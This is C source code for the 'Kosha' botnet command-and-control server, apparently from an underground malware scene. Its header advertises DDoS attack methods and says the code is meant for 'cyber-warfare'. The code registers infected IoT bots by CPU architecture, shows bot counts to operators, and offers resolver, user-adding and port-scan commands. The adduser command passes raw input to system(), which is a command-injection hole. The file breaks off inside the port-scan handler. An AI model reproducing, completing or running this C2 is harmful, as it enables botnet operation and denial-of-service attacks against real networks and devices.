/*

╔═══════════════════════════════════════════════╗
║            Kosha Project X C2 Source          ║
║                -------------                  ║
║                                               ║
║                   CREDITS                     ║
║                     ---                       ║
║                FLEXINGONLAMERS                ║
║                                               ║
║═══════════════════════════════════════════════║
║                                               ║
║  THIS IS IN BETA. THIS WILL NOT BE ANNOUNCED. ║
║  I AM NOT PLANNING A RELEASE UNTIL THIS HAS   ║
║  DIED OUT. ONCE RELEASED PAY RESPECTS TO THE  ║
║  OWNERS WHO GAVE UP THEIR TIME FOR THIS.      ║
║  THIS CODE HAS BEEN LICENSED UNDER GPU V3.0   ║
║  FOR ALLOWED USE IN 'CYBER-WARFARE'           ║
║  I HAVE CREATED THIS FOR A SELECT FEW USERS   ║
║  I DOUBT YOU WILL GET YOUR HANDS ON THIS.     ║
║             YOURS SINCERLY.                   ║
║                    ~ Jack, FlexingOnLamers.   ║
╚═══════════════════════════════════════════════╝
----------

        The Kosha Project Was founded by Georgia Cri Aka FlexingOnLamers
          This source will not be public until one of these fine young self-succers release it
            KGFL || RESENTUAL || SWIZZ || DARK || SOAP
              Hope you Enjoy!
                                                            ~ Jack, FlexingOnLamers.
                _________________________________________________________________________________________________________

Created C2 Base || Process Terminator
Added: AddUserFunction || Added UserAccounts || Added Alternative Chatroom Source || Added Functional Arch Detector (working on it, bc is broken)
Added: Added Portscanner || Added IPGeolocation
Added: Functional Logs, Includes ["IP", "Error", "LogOut", "Shell", "server"]
Added: UserID(s) ||  MD5Format For User Information


Managed Bot/Client
Added New Layer4 UDP Methods Including ["STOMP", "HOME", "RAID"]
Added New Layer4 TCP Methods Including ["TCP-CRI", "TCP-ZACH"]
Added: Arch Detector via ["x86_64", "x86_32", "Arm4", "Arm5", "Arm6", "Arm7", "Mips", "Mipsel", "Sh4", "Ppc", "spc", "M68k", "Arc"]
Added: Distro Detector via ["Ubuntu/Debian", "Gentoo", "REHL/Centos", "Open Suse"]
Added: DevType via ["Python", "python3", "perl"]
Added: Port Detector that dignifies Device Type via ["telnet", "ssh"] etc


Managed C2/CnC
Added: Logging via ["Kosha.log", "Kosha.log", "Kosha.log", "Kosha.log", "Kosha.log"]  // We are logging user commands, IPs, errors, shell attempts, and User Log-Outs
Added: Edits to (HELP) Including ["INFO", "BOTS"]
Color Codes were only Inputed for the Katura_IP.log || Now being inputted for the connection handler via screen

IPLookup Script And Snippet taken from "Cayosin", credits to the original developer of both the script and snippet of code.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>

#include "resolver.h" 

#define MAXFDS 1000000
//////////////////////////
#define Project "Kosha C2 Source"
#define Developer ["FlexingOnLamers", "GeorgiaCri"]
#define Homies ["Resentual", "KGFL", "Swizz", "Soap"]
#define tools ["adduser", "domainresolver", "portscanner", "IPGeoLocation"]

struct account 
{
  char user[200]; // username
  char password[200]; // password
  char id [200]; // admin / basic user 
};
static struct account accounts[500];

struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;
} managements[MAXFDS];

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
  int total = 0, got = 1;
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
  return got;
}
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl");
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl");
    return -1;
  }
  return 0;
}


static int create_and_bind(char *port)
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n");
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0; 
        clients[events[i].data.fd].x86 = 0;
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
        int dup = 0;
        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
          if(!clients[ipIndex].connected || ipIndex == infd) continue;
          if(clients[ipIndex].ip == clients[infd].ip) {
            dup = 1;
            break;
          }}
          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "!* KOSHA ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int thefd = events[i].data.fd;
        struct clientdata_t *client = &(clients[thefd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0; 
        client->mips = 0;
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
              continue;
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mx86_64\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mx86_32\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mMIPS\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mMPSL\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM4\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM5\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM6\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM7\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mPPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->ppc = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mSPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->spc = 1;
                        }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0; 
                                        client->sh4 = 0;
                                        client->x86 = 0;
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected() 
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}

    void *titleWriter(void *sock) 
    {
        int thefd = (long int)sock;
        char string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Kosha Project | IoT Devices: %d | Malware Enthusiast: %d %c", '\033', clientsConnected(), managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
            sleep(2);
        }
    }


int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("kosha.txt", "r")) == NULL) {
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
void client_addr(struct sockaddr_in addr) {
  printf("\x1b[1;37m[\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("Kosha_IP.log", "a");
  fprintf(logFile, "\n\x1b[1;37mIP:[\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}

void *telnetWorker(void *sock) {
  int thefd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char counter[2048];
  memset(counter, 0, 2048);
  char buf[2048];
  char* nickstring;
  char usernamez[80];
  char* password;
  char *admin = "admin"; 
  char *normal = "normal";
  memset(buf, 0, sizeof buf);
  char botnet[2048];
  memset(botnet, 0, 2048);

  FILE *fp;
  int i = 0;
  int c;
  fp = fopen("kosha.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id); 
    ++j;
  }

  char Prompt_1 [500];
  char Prompt_2 [500];
  char Prompt_3 [500];
  char Prompt_4 [500];
  char Prompt_5 [500];
  char Prompt_6 [500];
  char Prompt_7 [500];
  char Prompt_8 [500];
  char Prompt_9 [500];
  sprintf(Prompt_1,  "\x1b[1;37mWelcome To The \x1b[0;31mKosha \x1b[1;37mProject!\r\n");
  sprintf(Prompt_2,  "\x1b[1;37mAll \x1b[0;31mConnections\x1b[1;37m Are Logged, Please Do Not Share \x1b[0;31mLogins\x1b[1;37m!\r\n");
  sprintf(Prompt_3,  "\x1b[1;37mNo \x1b[0;31mSpamming\x1b[1;37m The \x1b[0;31mServer!\r\n");
  sprintf(Prompt_4,  "\x1b[1;37mFollow\x1b[0;31m Administrators\x1b[1;37m rules\r\n");
  sprintf(Prompt_5,  "\x1b[1;37mPlease Login Below\r\n");
        
  if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_1, strlen(Prompt_1), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_2, strlen(Prompt_2), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_3, strlen(Prompt_3), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_4, strlen(Prompt_4), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_5, strlen(Prompt_5), MSG_NOSIGNAL) == -1) goto end;

  sprintf(botnet, "\x1b[0;31mUsername\x1b[1;37m:");
  if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
  trim(buf);
  sprintf(usernamez, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

    if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
    if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(botnet, "\x1b[1;37mLogging In As User:\x1b[0;31m%s\r\n", accounts[find_line].user, buf);
    sprintf(botnet, "\x1b[1;37mPlease Enter Your \x1b[0;31mPassword\x1b[1;37m!\r\n");
    sprintf(botnet, "\x1b[0;31mPassword\x1b[1;37m:");
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
    goto Kosha;
  }
    failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000];
        char failed_line2[5000];

        char clearscreen [5000];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");

        sprintf(failed_line1, "\x1b[1;37mLogin \x1b[0;31mError\x1b[1;37m!\r\n");  // We are Attempting To Display FailedBanner!
        sprintf(failed_line2, "\x1b[1;37mIf you run into this issue please contact the \x1b[0;31mowner\x1b[1;37m!\r\n");  // We are Attempting To Display FailedBanner!


        sleep(1); // You Have Failed!
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        sleep(3);
        goto end; // You Have Failed!
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        Kosha: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char start_1 [90000];
        char start_2 [90000];
        char start_3 [90000];
        char start_4 [90000];
        char start_5 [90000];
        char start_6 [90000];
        char start_7 [90000];
        char start_8 [90000];
        char start_9 [90000];
        char start_10 [90000];
        char start_12 [90000];
        char start_13 [90000];
        char Kosha_1 [90000];
        char Kosha_2 [90000];
        char Kosha_3 [90000];
        char Kosha_4 [90000];
        char Kosha_5 [90000];
        char Kosha_6 [90000];
        char Kosha_7 [90000];
        char Kosha_8 [90000];
        char Kosha_9 [90000];

    
        // clear
        sprintf(start_1,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mRemoving All Traces Of \e[1;35mLD_Preload\x1b[1;37m..\r\n");
        sprintf(start_2,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mFinished Removing ALL Traces Of \e[1;35mLD_Preload\x1b[1;37m!\r\n");
        // clear 
        sprintf(start_3,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mMasking Connection From \e[1;35mutmp\x1b[1;37m+\e[1;35mwtmp\x1b[1;37m...\r\n");
        sprintf(start_4,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mSucessfully Masked Connection! \r\n");
        // clear
        sprintf(start_5,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mMarking All \e[1;35mIP Header Modification \x1b[1;37mExtensions...\r\n");
        sprintf(start_6,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mFinished Marking \e[1;35mIPHM \x1b[1;37mExtensions!\r\n");
        // clear
        sprintf(start_7,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mLogging User Information..\r\n");
        sprintf(start_8,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mUser Information Successfully Logged!\r\n");
        // clear
        sprintf(start_9,  "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mWelcome [\x1b[0;31m%s\x1b[1;37m] \r\n", accounts[find_line].user, buf);
        sprintf(start_10, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mYour Access Level Is \x1b[0;31m%s\x1b[1;37m!\r\n", accounts[find_line].id, buf);
        sprintf(start_12, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[1;37mLoading \x1b[0;31mKosha \e[1;35mC2\x1b[1;37m Session.. \r\n");
        sprintf(start_13, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \e[90m| \x1b[0;31mKosha\e[1;35m C2 \x1b[1;37mSession Loaded! \r\n");
        //clear
        sprintf(Kosha_1, "\x1b[0;31m          888    d8P                    888               \r\n");
        sprintf(Kosha_2, "\x1b[0;31m          888   d8P                     888               \r\n");
        sprintf(Kosha_3, "\x1b[0;31m          888  d8P                      888               \r\n");
        sprintf(Kosha_4, "\x1b[0;31m          888d88K      .d88b.  .d8888b  88888b.   8888b.  \r\n");
        sprintf(Kosha_5, "\x1b[0;31m          8888888b    d88  88b 88K      888  88b      88b \r\n");
        sprintf(Kosha_6, "\x1b[0;31m          888  Y88b   888  888  Y8888b. 888  888 .d888888 \r\n");
        sprintf(Kosha_7, "\x1b[0;31m          888   Y88b  Y88  88P      X88 888  888 888  888 \r\n");
        sprintf(Kosha_8, "\x1b[0;31m          888    Y88b   Y88P    88888P  888  888  Y888888 \r\n");
        sprintf(Kosha_9, "\x1b[1;37m                \x1b[1;37mUser: \x1b[0;31m%s \x1b[1;37m|| Access Level:\x1b[0;31m %s\x1b[1;37m\r\n", accounts[find_line].user, accounts[find_line].id, buf);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, start_1, strlen(start_1), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_2, strlen(start_2), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_3, strlen(start_3), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_4, strlen(start_4), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_5, strlen(start_5), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_6, strlen(start_6), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_7, strlen(start_7), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_8, strlen(start_8), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_9, strlen(start_9), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_10, strlen(start_10), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if(send(thefd, start_12, strlen(start_12), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if(send(thefd, start_13, strlen(start_13), MSG_NOSIGNAL) == -1) goto end;
        sleep (5);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_1, strlen(Kosha_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_2, strlen(Kosha_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_3, strlen(Kosha_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_4, strlen(Kosha_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_5, strlen(Kosha_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_6, strlen(Kosha_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_7, strlen(Kosha_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_8, strlen(Kosha_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_9, strlen(Kosha_9), MSG_NOSIGNAL) == -1) goto end;
        while(1) 
        { // We are Displaying Attempting to display main banner!
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        break; // World Break!
        } // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        managements[thefd].connected = 1; // We are Displaying Attempting to display main banner!

      while(fdgets(buf, sizeof buf, thefd) > 0)
      {
      if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "COUNT") || strstr(buf, "count")) 
      {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
      char total[128];
      char mips[128];
      char sh4[128];
      char arm[128];
      char ppc[128];
      char x86[128];
      char spc[128];
      sprintf(mips,     "\x1b[1;37mKosha\x1b[0;31m@\x1b[1;37mmps\x1b[0;31m-\x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", mipsConnected());
      sprintf(arm,      "\x1b[1;37mKosha\x1b[0;31m@\x1b[1;37marm\x1b[0;31m-\x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", armConnected());
      sprintf(sh4,      "\x1b[1;37mKosha\x1b[0;31m@\x1b[1;37msh4\x1b[0;31m-\x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", sh4Connected());
      sprintf(ppc,      "\x1b[1;37mKosha\x1b[0;31m@\x1b[1;37mppc\x1b[0;31m-\x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", ppcConnected());
      sprintf(x86,      "\x1b[1;37mKosha\x1b[0;31m@\x1b[1;37mx86\x1b[0;31m-\x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", x86Connected());
      sprintf(spc,      "\x1b[1;37mKosha\x1b[0;31m@\x1b[1;37mspc\x1b[0;31m-\x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", spcConnected());
      sprintf(total,    "\x1b[1;37mKosha\x1b[0;31m@\x1b[1;37mttl\x1b[0;31m-\x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", clientsConnected());
      if (send(thefd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
      }
        else
      {
        sprintf(botnet, "\x1b[0;31mAdmins Only!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }  
      if (strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
      {
      char *ip[100];
      char *token = strtok(buf, " ");
      char *url = token+sizeof(token);
      trim(url);
      resolve(url, ip);
          sprintf(botnet, "Resolved \x1b[1;37m[\x1b[0;31m%s\x1b[1;37m] to \x1b[1;37m[\x1b[0;31m%s\x1b[1;37m]\r\n", url, ip);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
    {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
        char *token = strtok(buf, " ");
        char *userinfo = token+sizeof(token);
        trim(userinfo);
        char *uinfo[50];
        sprintf(uinfo, "echo '%s' >> kosha.txt", userinfo);
        system(uinfo);
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, userinfo);
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Successfully Added!\r\n", userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        sprintf(botnet, "\x1b[0;31mAdmins Only!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }
        else if(strstr(buf, "PORTSCAN") || strstr(buf, "portscan"))
        {
            int x;
            int ps_timeout = 3;
            int least_port = 1;
            int max_port = 65535;
